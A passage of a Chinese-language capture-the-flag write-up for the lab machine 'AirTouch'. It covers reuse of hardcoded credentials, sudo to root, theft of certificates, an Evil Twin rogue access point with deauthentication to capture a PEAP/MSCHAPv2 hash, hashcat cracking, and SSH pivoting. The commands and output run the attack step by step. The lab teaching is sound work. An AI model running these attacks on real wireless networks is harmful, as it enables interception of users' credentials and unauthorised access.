  if (isset($logins[$Username]) && $logins[$Username]['password'] === $Password) {
    /* Success: Set session variables and redirect to Protected page  */
    $_SESSION['UserData']['Username'] = $logins[$Username]['password'];
    /* Success: Set session variables USERNAME  */
    $_SESSION['Username'] = $Username;

    // Set a cookie with the user's role
    setcookie('UserRole', $logins[$Username]['role'], time() + (86400 * 30), "/"); // 86400 = 1 day

    header("location:index.php");
    exit;
  } else {
    /*Unsuccessful attempt: Set error message */
    $msg = "<span style='color:red'>Invalid Login Details</span>";
  }
}

?>


<!DOCTYPE html>
<html>

<head>
  <title>WiFi Router Configuration</title>
  <link rel="stylesheet" href="style.css">
</head>

<body>


<div class="content">
  <h3>PSK Router Login</h3>
  <form action="" method="post" name="Login_Form">
    <table width="400" border="0" align="center" cellpadding="5" cellspacing="1" class="Table">
      <?php if (isset($msg)) { ?>
        <tr>
          <td colspan="2" align="center" valign="top">
            <?php echo $msg; ?>
          </td>
        </tr>
      <?php } ?>
      <tr>
        <td colspan="2" align="left" valign="top">
          <h3>Login</h3>
        </td>
      </tr>
      <tr>
        <td align="right" valign="top">Username</td>
        <td><input name="Username" type="text" class="Input"></td>
      </tr>
      <tr>
        <td align="right">Password</td>
        <td><input name="Password" type="password" class="Input"></td>
      </tr>
      <tr>
        <td> </td>
        <td><input name="Submit" type="submit" value="Login" class="Button3"></td>
      </tr>
    </table>
  </form>
      </div>
</body>

</html>
```

没想到后端没有通过数据库去验证账密信息，而是直接嵌入代码之中，账密：

```
admin:JunDRDZKHDnpkpDDvay
user:2wLFYNh4TSTgA5sNgT4
```

可能存在账密复用的现象，但是我们在家目录中只看到了 user 目录，说明该系统中很可能没有 admin 用户，尝试一下：

```bash
user@AirTouch-AP-PSK:/var/www/html$ su admin -
su: user admin does not exist
```

果然，那么尝试 user：

```bash
www-data@AirTouch-AP-PSK:/var/www/html$ su user -
Password: 
user@AirTouch-AP-PSK:/var/www/html$
```

成功了，成功的密码是 `JunDRDZKHDnpkpDDvay`。

## 六、User Flag

简单信息搜集后，能发现：

```bash
user@AirTouch-AP-PSK:/var/www/html$ sudo -l
Matching Defaults entries for user on AirTouch-AP-PSK:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on AirTouch-AP-PSK:
    (ALL) NOPASSWD: ALL
```

和之前一样，能无密码、以任何权限运行任何命令，直接切换 root 账户：

```bash
user@AirTouch-AP-PSK:/var/www/html$ sudo -i
root@AirTouch-AP-PSK:~# 
```

在家目录中可以看到 User Flag：

```bash
root@AirTouch-AP-PSK:~# cat /root/user.txt 
58ce1d****************
```

## 七、Evil Twin

### 1、分析

在家目录中，不仅有用户 flag，还有其他的信息：

```bash
root@AirTouch-AP-PSK:~# ls -la
total 44
drwx------ 1 root root 4096 May  7 01:21 .
drwxr-xr-x 1 root root 4096 May  7 01:21 ..
lrwxrwxrwx 1 root root    9 Nov 24  2024 .bash_history -> /dev/null
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
drwxr-xr-x 2 root root 4096 Mar 27  2024 certs-backup
-rwxr-xr-x 1 root root    0 Mar 27  2024 cronAPs.sh
drwxr-xr-x 1 root root 4096 May  7 01:21 psk
-rw-r--r-- 1 root root  364 Nov 24  2024 send_certs.sh
-rwxr-xr-x 1 root root 1963 Mar 27  2024 start.sh
-rw-r----- 1 root 1001   33 May  7 01:21 user.txt
-rw-r--r-- 1 root root  319 Mar 27  2024 wlan_config_aps
```

可以看到一个证书备份（certs-backup）：

```bash
root@AirTouch-AP-PSK:~/certs-backup# ls -la
total 40
drwxr-xr-x 2 root root 4096 Mar 27  2024 .
drwx------ 1 root root 4096 May  7 01:21 ..
-rw-r--r-- 1 root root 1124 Mar 27  2024 ca.conf
-rw-r--r-- 1 root root 1712 Mar 27  2024 ca.crt
-rw-r--r-- 1 root root 1111 Mar 27  2024 server.conf
-rw-r--r-- 1 root root 1493 Mar 27  2024 server.crt
-rw-r--r-- 1 root root 1033 Mar 27  2024 server.csr
-rw-r--r-- 1 root root  168 Mar 27  2024 server.ext
-rw-r--r-- 1 root root 1704 Mar 27  2024 server.key
```

还有一个 send_certs 脚本：

```bash
#!/bin/bash

# DO NOT COPY
# Script to sync certs-backup folder to AirTouch-office. 

# Define variables
REMOTE_USER="remote"
REMOTE_PASSWORD="xGgWEwqUpfoOVsLeROeG"
REMOTE_PATH="~/certs-backup/"
LOCAL_FOLDER="/root/certs-backup/"

# Use sshpass to send the folder via SCP
sshpass -p "$REMOTE_PASSWORD" scp -r "$LOCAL_FOLDER" "$REMOTE_USER@10.10.10.1:$REMOTE_PATH"
```

这个脚本虽然很短，但是信息量不小：

- `10.10.10.1` 是拓扑图中 Corp Vlan 中的设别
- `10.10.10.1` 该主机上有一个用户名为 remote，其密码为 `xGgWEwqUpfoOVsLeROeG`
- `10.10.10.1` 该主机上被存入了与本地一样的 `certs-backup`

先看看本地路由信息：

```bash
root@AirTouch-AP-PSK:~# ip route show
192.168.3.0/24 dev wlan7 proto kernel scope link src 192.168.3.1 
192.168.4.0/24 dev wlan8 proto kernel scope link src 192.168.4.1 
192.168.5.0/24 dev wlan9 proto kernel scope link src 192.168.5.1 
192.168.6.0/24 dev wlan10 proto kernel scope link src 192.168.6.1 
192.168.7.0/24 dev wlan11 proto kernel scope link src 192.168.7.1 
```

没有到达 `10.10.10.0/24` 的路由，看来无法直接通过 `ssh` 登入 `10.10.10.1` 主机。

先分析一下这些证书的含义。

`ca.conf`、`ca.crt`，这分别是 CA 的配置和公钥证书，这能说明这台设备自建了一个 CA，用来签发其他证书。

但是没有看到私钥信息（`ca.key`），这也意味着我们无法自签一个合法证书出来。

还有一部分是 `server.conf`、`server.csr`、`server.crt`、`server.key`、`server.ext`

这些都是生成服务器证书的过程需要物，最终的服务器证书是 `server.crt`（经过 CA 签发的）。

| 文件            | 作用             |
| ------------- | -------------- |
| `server.conf` | OpenSSL 配置     |
| `server.key`  | 服务器私钥          |
| `server.csr`  | 证书签名请求         |
| `server.ext`  | 扩展字段           |
| `server.crt`  | CA 签发后的最终服务器证书 |

一个标准的 OpenSSL 自签证书流程：

```bash
# 1. 生成 CA
openssl req -x509 -new -key ca.key -config ca.conf -out ca.crt

# 2. 生成服务器 key + csr
openssl req -new -key server.key -config server.conf -out server.csr

# 3. CA 用 server.ext 签发
openssl x509 -req -in server.csr -CA ca.crt -CAkey ca.key -extfile server.ext -out server.crt
```

脚本中的注释信息：

```
# Script to sync certs-backup folder to AirTouch-office. 
```

> 译文：本脚本用于同步 `certs-backup` 目录到 AirTouch-office。

而且，脚本中的 `scp` 操作也印证了同步（`sync`）操作：

```bash
sshpass -p "$REMOTE_PASSWORD" scp -r "$LOCAL_FOLDER" "$REMOTE_USER@10.10.10.1:$REMOTE_PATH"
```

综上，AP（AirTouch-office）拥有服务器证书（`server.crt`）还有对应的用于证书签名的私钥（`server.key`）。

以此，我们可以合理推断，AP（AirTouch-office）与客户端进行验证的证书信息就是当前目录中所看到的证书信息。

结合之前看到的 Evil Twin 工具包，不难想到这里很可能就是让我们打 Evil Twin。

先将证书放到普通用户可读的地方：

```bash
root@AirTouch-AP-PSK:~# cp -r certs-backup/ /tmp
```

接着回到 consultant laptop 上，下载证书到本地：

```bash
root@AirTouch-Consultant:~/eaphammer# scp -r user@192.168.3.1:/tmp/certs-backup ./
user@192.168.3.1's password: 
server.csr                                                                                                                                      100% 1033     2.1MB/s   00:00    
server.crt                                                                                                                                      100% 1493     2.2MB/s   00:00    
ca.crt                                                                                                                                          100% 1712     2.3MB/s   00:00    
ca.conf                                                                                                                                         100% 1124     1.6MB/s   00:00    
server.conf                                                                                                                                     100% 1111     1.2MB/s   00:00    
server.ext                                                                                                                                      100%  168   484.1KB/s   00:00    
server.key                                                                                                                                      100% 1704     3.2MB/s   00:00    
root@AirTouch-Consultant:~/eaphammer# ls
Changelog          __version__.py  core       forge-beacons          loot                     pip.req                    scripts    ubuntu-unattended-setup
ESSIDStripping.md  base            db         kali-dependencies.txt  parrot-dependencies.txt  raspbian-dependencies.txt  settings   wordlists
LICENSE            cert_wizard     docs       kali-setup             parrot-setup             raspbian-setup             templates
README.md          certs           eaphammer  local                  payload_generator        run                        testing
SECURITY.md        certs-backup    ehdb       logs                   payloads                 saved-configs              tmp
```

### 2、Evil Twin 介绍

Evil Twin（邪恶双胞胎）是一种针对无线网络的中间人攻击（MITM）技术。攻击者搭建一个与合法 AP（Access Point，无线接入点）具有相同 SSID（网络名称）的伪造 AP，诱骗客户端连接到这个假的 AP，从而窃取凭据、会话或执行进一步的攻击。

客户端（手机、笔记本等）在 WiFi 选择时，主要依赖 **SSID 名称** 来识别网络。

如果攻击者的假 AP 符合：

- SSID 相同
- 信号更强
- BSSID（MAC 地址）看起来合法

客户端（或者用户）就可能被骗连接到假 AP。

### 3、证书的必要性

通过之前的无线流量探测，我们知道 AirTouch-Office 的认证方式是  802.1x 即 WPA2-Enterprise，这是 WPA2 下的另一个模式：

| 模式              | 别名                     | 密钥/凭据          | 适用场景     |
| --------------- | ---------------------- | -------------- | -------- |
| WPA2-Personal   | WPA2-PSK               | 所有用户共享一个预共享密钥  | 家庭、小型办公室 |
| WPA2-Enterprise | WPA2-EAP / WPA2-802.1X | 每用户独立凭据（密码/证书） | 企业、校园、政府 |

WPA2-Enterprise 涉及三个角色：

| 角色    | 常见名称                  | 作用                                       |
| ----- | --------------------- | ---------------------------------------- |
| 客户端   | Supplicant            | 手机、电脑、无线网卡                               |
| AP    | Authenticator         | 无线接入点，负责拦截认证流量                           |
| 认证服务器 | Authentication Server | 通常是 RADIUS 服务器，比如 FreeRADIUS、Windows NPS |

其认证过程如下图：

![[ChatGPT Image 2026年5月8日 15_22_13.png]]

在 EAP Challenge Request、EAP Challenge Response 这一组交互中，若 EAP 方法选择的是 EAP-TLS、EAP-PEAP 等基于 TLS 的，服务器证书会随 EAP Challenge Request 被封装传递给客户端。

客户端在收到服务器证书后进行校验：

|校验项|说明|
|---|---|
|证书链|是否由受信任的 CA 签发|
|有效期|证书是否过期或尚未生效|
|主体名称|证书 CN / SAN 是否匹配配置的认证服务器名称|
|用途|是否具备服务器认证用途|
|吊销状态|是否被 CRL / OCSP 吊销，取决于客户端配置|

本吧及采用的 EAP 方法是什么呢？

可以抓一次流量：

```bash
airodump-ng wlan0mon --channel 44 --bssid AC:8B:A9:AA:3F:D2 -w /tmp/airtouch-office
```

![[file-20260508154410931.png]]

将流量包下载到本地，打开 WireShark 进行分析：

```bash
zyf@kali:~/htb % scp consultant@10.129.244.98:/tmp/airtouch-office-02.cap ./
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
consultant@10.129.244.98's password: 
airtouch-office-02.cap
```

过滤 eap 协议：

![[file-20260508154624924.png]]

就可以看到采用的是 EAP-PEAP 方法。

因此，要实现 Evil Twin，证书的导入是必要的，否则无法完整验证。

### 4、开始攻击

首先导入证书：

```bash
root@AirTouch-Consultant:~/eaphammer# ./eaphammer --cert-wizard import --server-cert ./certs-backup/server.crt --ca-cert ./certs-backup/ca.crt --private-key ./certs-backup/server.key

                     .__                                         
  ____ _____  ______ |  |__ _____    _____   _____   ___________ 
_/ __ \\__  \ \____ \|  |  \\__  \  /     \ /     \_/ __ \_  __ \
\  ___/ / __ \|  |_> >   Y  \/ __ \|  Y Y  \  Y Y  \  ___/|  | \/
 \___  >____  /   __/|___|  (____  /__|_|  /__|_|  /\___  >__|   
     \/     \/|__|        \/     \/      \/      \/     \/       


                        Now with more fast travel than a next-gen Bethesda game. >:D

                             Version:  1.14.0
                            Codename:  Final Frontier
                              Author:  @s0lst1c3
                             Contact:  gabriel<<at>>transmitengage.com

    
[?] Am I root?
[*] Checking for rootness...
[*] I AM ROOOOOOOOOOOOT
[*] Root privs confirmed! 8D
Case 1: Import all separate
[CW] Ensuring server cert, CA cert, and private key are valid...
./certs-backup/server.crt
./certs-backup/server.key
./certs-backup/ca.crt
[CW] Complete!
[CW] Loading private key from ./certs-backup/server.key
[CW] Complete!
[CW] Loading server cert from ./certs-backup/server.crt
[CW] Complete!
[CW] Loading CA certificate chain from ./certs-backup/ca.crt
[CW] Complete!
[CW] Constructing full certificate chain with integrated key...
[CW] Complete!
[CW] Writing private key and full certificate chain to file...
[CW] Complete!
[CW] Private key and full certificate chain written to: /root/eaphammer/certs/server/AirTouch CA.pem
[CW] Activating full certificate chain...
[CW] Complete!
```

使用一个空闲的 wlan 接口（我这使用的是 wlan3）用作邪恶 AP：

```bash
./eaphammer -i wlan3 --auth wpa-eap --essid AirTouch-Office
```

> 保持这个终端运行。

另开一个 Consultant 的 root shell，发起 Deauth 攻击（因为我们要断开客户端现有的连接，并让他们尝试连接邪恶 AP）

将 wlan4 设为 monitor 模式，并实行 Deauth 攻击：

```
root@AirTouch-Consultant:~/eaphammer# iw dev wlan4 set type monitor
root@AirTouch-Consultant:~/eaphammer# ip link set wlan4 up
root@AirTouch-Consultant:~/eaphammer# iw dev wlan4 set channel 44
root@AirTouch-Consultant:~/eaphammer# aireplay-ng -0 10 -a AC:8B:A9:AA:3F:D2 wlan4; aireplay-ng -0 10 -a AC:8B:A9:F3:A1:13 wlan4
07:55:26  Waiting for beacon frame (BSSID: AC:8B:A9:AA:3F:D2) on channel 44
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
07:55:26  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]
07:55:27  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]
07:55:27  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]
07:55:28  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]
07:55:28  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]
07:55:29  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]
07:55:29  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]
07:55:30  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]
07:55:30  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]
07:55:30  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:AA:3F:D2]
07:55:31  Waiting for beacon frame (BSSID: AC:8B:A9:F3:A1:13) on channel 44
NB: this attack is more effective when targeting
a connected wireless client (-c <client's mac>).
07:55:31  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]
07:55:31  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]
07:55:32  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]
07:55:32  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]
07:55:33  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]
07:55:33  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]
07:55:34  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]
07:55:34  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]
07:55:35  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]
07:55:35  Sending DeAuth (code 7) to broadcast -- BSSID: [AC:8B:A9:F3:A1:13]
```

回到 eaphammer 的终端窗口，会看到：

```
mschapv2: Fri May  8 07:55:45 2026
	 domain\username:		AirTouch\r4ulcl
	 username:			r4ulcl
	 challenge:			36:0a:c3:ce:24:50:6e:8b
	 response:			1d:61:d1:7d:49:7f:d7:c8:dc:6c:33:f0:ab:0f:3d:21:33:a4:b6:2b:4c:88:d0:15

	 jtr NETNTLM:			r4ulcl:$NETNTLM$360ac3ce24506e8b$1d61d17d497fd7c8dc6c33f0ab0f3d2133a4b62b4c88d015

	 hashcat NETNTLM:		r4ulcl::::1d61d17d497fd7c8dc6c33f0ab0f3d2133a4b62b4c88d015:360ac3ce24506e8b
```

为什么呢？

再次回到 WPA2-Enterprise 的认证过程，在证书校验通过之后，会进行 MSCHAPv2 认证，认证过程中就会出现上述信息：

```
domain\username:AirTouch\r4ulcl
username:r4ulcl
challenge:36:0a:c3:ce:24:50:6e:8b
response:1d:61:d1:7d:49:7f:d7:c8:dc:6c:33:f0:ab:0f:3d:21:33:a4:b6:2b:4c:88:d0:15
NT-Response:1d61d17d497fd7c8dc6c33f0ab0f3d2133a4b62b4c88d015:360ac3ce24506e8b
```

NT-Response 的计算公式（简化版）：

```
NT-Hash = MD4(UTF-16-LE(password))
Challenge-Hash = SHA1(PeerChallenge || AuthChallenge || Username)[:8]
NT-Response = DES(Challenge-Hash, NT-Hash[0..6]) 
            || DES(Challenge-Hash, NT-Hash[7..13])
            || DES(Challenge-Hash, NT-Hash[14..15] || '\0\0\0\0\0')
```

很明显，又可以简化成：

```
NT-Response = f(password)
```

符合爆破的条件。

本地破解 Hash：

```bash
zyf@kali:~/htb % echo 'r4ulcl::::1d61d17d497fd7c8dc6c33f0ab0f3d2133a4b62b4c88d015:360ac3ce24506e8b' > /tmp/airtouch_office.hash
zyf@kali:~/htb % hashcat -m 5500 /tmp/airtouch_office.hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt          
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) Ultra 9 285H, 2930/5861 MB (1024 MB allocatable), 16MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 516 MB (3083 MB free)

Dictionary cache hit:
* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

r4ulcl::::1d61d17d497fd7c8dc6c33f0ab0f3d2133a4b62b4c88d015:360ac3ce24506e8b:laboratory
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5500 (NetNTLMv1 / NetNTLMv1+ESS)
Hash.Target......: r4ulcl::::1d61d17d497fd7c8dc6c33f0ab0f3d2133a4b62b4...506e8b
Time.Started.....: Fri May  8 16:00:06 2026 (1 sec)
Time.Estimated...: Fri May  8 16:00:07 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:  1851.5 kH/s (0.60ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 98304/14344384 (0.69%)
Rejected.........: 0/98304 (0.00%)
Restore.Point....: 81920/14344384 (0.57%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: janiece -> Dominic1
Hardware.Mon.#01.: Util:  9%

Started: Fri May  8 16:00:04 2026
Stopped: Fri May  8 16:00:08 2026
```

最终得到的密码就是：

```
laboratory
```

## 八、连接到 AirTouch-Office

### 1、连接无线局域网

还是老操作，先要创建连接配置文件，但是注意 `wpa_passphrase` 不能用于 WPA2-Enterprise，它只适用于 WPA2-PSK 网络。

因此需要手动创建：

```bash
cat > /tmp/airtouch-office.conf << 'EOF'
network={
    ssid="AirTouch-Office"
    key_mgmt=WPA-EAP
    eap=PEAP
    identity="AirTouch\r4ulcl"
    password="laboratory"
    phase2="auth=MSCHAPV2"
}
EOF
```

连接：

```bash
root@AirTouch-Consultant:~/eaphammer# wpa_supplicant -i wlan6 -c /tmp/airtouch-office.conf
Successfully initialized wpa_supplicant
rfkill: Cannot open RFKILL control device
rfkill: Cannot get wiphy information
wlan6: SME: Trying to authenticate with ac:8b:a9:aa:3f:d2 (SSID='AirTouch-Office' freq=5220 MHz)
wlan6: Trying to associate with ac:8b:a9:aa:3f:d2 (SSID='AirTouch-Office' freq=5220 MHz)
wlan6: Associated with ac:8b:a9:aa:3f:d2
wlan6: CTRL-EVENT-SUBNET-STATUS-UPDATE status=0
wlan6: CTRL-EVENT-EAP-STARTED EAP authentication started
wlan6: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
wlan6: CTRL-EVENT-EAP-METHOD EAP vendor 0 method 25 (PEAP) selected
wlan6: CTRL-EVENT-EAP-PEER-CERT depth=1 subject='/C=ES/ST=Madrid/L=Madrid/O=AirTouch/OU=Certificate Authority/CN=AirTouch CA/emailAddress=ca@AirTouch.htb' hash=222a7dd4d28c97c8e4730762fa9a102af05c7d56b35279b2f5ee4da7ddf918a8
wlan6: CTRL-EVENT-EAP-PEER-CERT depth=1 subject='/C=ES/ST=Madrid/L=Madrid/O=AirTouch/OU=Certificate Authority/CN=AirTouch CA/emailAddress=ca@AirTouch.htb' hash=222a7dd4d28c97c8e4730762fa9a102af05c7d56b35279b2f5ee4da7ddf918a8
wlan6: CTRL-EVENT-EAP-PEER-CERT depth=0 subject='/C=ES/L=Madrid/O=AirTouch/OU=Server/CN=AirTouch CA/emailAddress=server@AirTouch.htb' hash=ef39f3fff0883db7fc8a535c52f80509fc395e9889061e209102307b46995864
EAP-MSCHAPV2: Authentication succeeded
wlan6: CTRL-EVENT-EAP-SUCCESS EAP authentication completed successfully
wlan6: PMKSA-CACHE-ADDED ac:8b:a9:aa:3f:d2 0
wlan6: WPA: Key negotiation completed with ac:8b:a9:aa:3f:d2 [PTK=CCMP GTK=CCMP]
wlan6: CTRL-EVENT-CONNECTED - Connection to ac:8b:a9:aa:3f:d2 completed [id=0 id_str=]
```

获取 IP：

```bash
root@AirTouch-Consultant:~/eaphammer# dhclient -v wlan6
Internet Systems Consortium DHCP Client 4.4.1
Copyright 2004-2018 Internet Systems Consortium.
All rights reserved.
For info, please visit https://www.isc.org/software/dhcp/

Listening on LPF/wlan6/02:00:00:00:06:00
Sending on   LPF/wlan6/02:00:00:00:06:00
Sending on   Socket/fallback
DHCPDISCOVER on wlan6 to 255.255.255.255 port 67 interval 3 (xid=0x3fbd3e07)
DHCPDISCOVER on wlan6 to 255.255.255.255 port 67 interval 4 (xid=0x3fbd3e07)
DHCPOFFER of 10.10.10.38 from 10.10.10.1
DHCPREQUEST for 10.10.10.38 on wlan6 to 255.255.255.255 port 67 (xid=0x73ebd3f)
DHCPACK of 10.10.10.38 from 10.10.10.1 (xid=0x3fbd3e07)
bound to 10.10.10.38 -- renewal in 372846 seconds.
```

分配到的是 `10.10.10.38`：

```bash
root@AirTouch-Consultant:~/eaphammer# ip addr show wlan6
13: wlan6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 02:00:00:00:06:00 brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.38/24 brd 10.10.10.255 scope global dynamic wlan6
       valid_lft 863979sec preferred_lft 863979sec
    inet6 fe80::ff:fe00:600/64 scope link 
       valid_lft forever preferred_lft forever
```

查看路由是否已经自动建立：

```bash
root@AirTouch-Consultant:~/eaphammer# ip route show
default via 172.20.1.1 dev eth0 
10.10.10.0/24 dev wlan6 proto kernel scope link src 10.10.10.38 
172.20.1.0/24 dev eth0 proto kernel scope link src 172.20.1.2 
192.168.3.0/24 dev wlan1 proto kernel scope link src 192.168.3.23
```

已经有了 `10.10.10.0/24` 网段的路由了。

### 2、remote shell

之前是获得过 AirTouch-Office 的 IP 和密码信息的：

```
REMOTE_USER="remote"
REMOTE_PASSWORD="xGgWEwqUpfoOVsLeROeG"
IP:10.10.10.1
```

直接 ssh 登入：

```bash
root@AirTouch-Consultant:~/eaphammer# ssh remote@10.10.10.1
The authenticity of host '10.10.10.1 (10.10.10.1)' can't be established.
ECDSA key fingerprint is SHA256:/lSCXr95A71FBCcQ9DT1xXMFeCAsLEnCUfSwu/3qPoE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.1' (ECDSA) to the list of known hosts.
remote@10.10.10.1's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

remote@AirTouch-AP-MGT:~$ 
```

### 3、Root Flag

家目录中没看到 flag 文件：

```bash
remote@AirTouch-AP-MGT:~$ ls -la
total 36
drwxr-xr-x 1 remote remote 4096 May  8 08:42 .
drwxr-xr-x 1 root   root   4096 Jan 13 14:55 ..
-rw-rw-r-- 1 remote remote    1 Nov 24  2024 .bash_history
-rw-r--r-- 1 remote remote  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 remote remote 3771 Feb 25  2020 .bashrc
drwx------ 2 remote remote 4096 May  8 08:42 .cache
-rw-r--r-- 1 remote remote  807 Feb 25  2020 .profile
```

确认是普通用户：

```bash
remote@AirTouch-AP-MGT:~$ id
uid=1000(remote) gid=1000(remote) groups=1000(remote)
```

也没有发现 sudo 权限：

```bash
remote@AirTouch-AP-MGT:~$ sudo -l
[sudo] password for remote: 
Sorry, user remote may not run sudo on AirTouch-AP-MGT.
```

查看文件所有者为 root 的且设置了 suid 位的文件：

```bash
remote@AirTouch-AP-MGT:/$ find / -type f -perm -04000 -ls 2>/dev/null
   111057     52 -rwsr-xr--   1 root     messagebus    51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   119287    468 -rwsr-xr-x   1 root     root         477672 Jan  2  2024 /usr/lib/openssh/ssh-keysign
    99754     52 -rwsr-xr-x   1 root     root          53040 Feb  6  2024 /usr/bin/chsh
    99976     40 -rwsr-xr-x   1 root     root          39144 Apr  9  2024 /usr/bin/umount
    99815     88 -rwsr-xr-x   1 root     root          88464 Feb  6  2024 /usr/bin/gpasswd
    99748     84 -rwsr-xr-x   1 root     root          85064 Feb  6  2024 /usr/bin/chfn
    99888     68 -rwsr-xr-x   1 root     root          68208 Feb  6  2024 /usr/bin/passwd
    99877     44 -rwsr-xr-x   1 root     root          44784 Feb  6  2024 /usr/bin/newgrp
    99872     56 -rwsr-xr-x   1 root     root          55528 Apr  9  2024 /usr/bin/mount
    99951     68 -rwsr-xr-x   1 root     root          67816 Apr  9  2024 /usr/bin/su
   116053    164 -rwsr-xr-x   1 root     root         166056 Apr  4  2023 /usr/bin/sudo
```

没有发现有 suid 提权的文件。

在家目录中看到一个 admin 文件夹：

```bash
remote@AirTouch-AP-MGT:/home$ ls
admin  remote
```

说明是存在 admin 用户的。

查看一下所有用户的进程

```bash
remote@AirTouch-AP-MGT:/home/admin$ ps auxww
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   2608   524 ?        Ss   05:45   0:00 /bin/sh -c service ssh start && tail -f /dev/null
root          14  0.0  0.1  12188  4244 ?        Ss   05:45   0:01 sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups
root          15  0.0  0.0   2544   572 ?        S    05:45   0:00 tail -f /dev/null
root          27  0.0  0.0   3976  3128 ?        Ss   05:45   0:00 bash /root/start.sh
root          44  0.1  0.2  10740  8052 ?        S    05:45   0:17 hostapd_aps /root/mgt/hostapd_wpe.conf
root          45  0.0  0.1  10628  7688 ?        S    05:45   0:11 hostapd_aps /root/mgt/hostapd_wpe2.conf
root          62  0.0  0.0   9300  3564 ?        S    05:45   0:00 dnsmasq -d
root       33720  0.0  0.2  13908  9056 ?        Ss   08:41   0:00 sshd: remote [priv]
remote     33763  0.0  0.1  13908  5464 ?        R    08:42   0:00 sshd: remote@pts/0
remote     33764  0.0  0.0   5992  3984 pts/0    Ss   08:42   0:00 -bash
remote     37240  0.0  0.0   7644  3228 pts/0    R+   09:00   0:00 ps auxww
```

发现两个并不是系统命令：

```bash
hostapd_aps /root/mgt/hostapd_wpe.conf
hostapd_aps /root/mgt/hostapd_wpe2.conf
```

可以看到帮助信息：

```bash
remote@AirTouch-AP-MGT:/home/admin$ hostapd_aps -help
hostapd v2.9
User space daemon for IEEE 802.11 AP management,
IEEE 802.1X/WPA/WPA2/EAP/RADIUS Authenticator
Copyright (c) 2002-2019, Jouni Malinen <j@w1.fi> and contributors

usage: hostapd [-hdBKtv] [-P <PID file>] [-e <entropy file>] \
         [-g <global ctrl_iface>] [-G <group>]\
         [-i <comma-separated list of interface names>]\
         <configuration file(s)>

options:
   -h   show this usage
   -d   show more debug messages (-dd for even more)
   -B   run daemon in the background
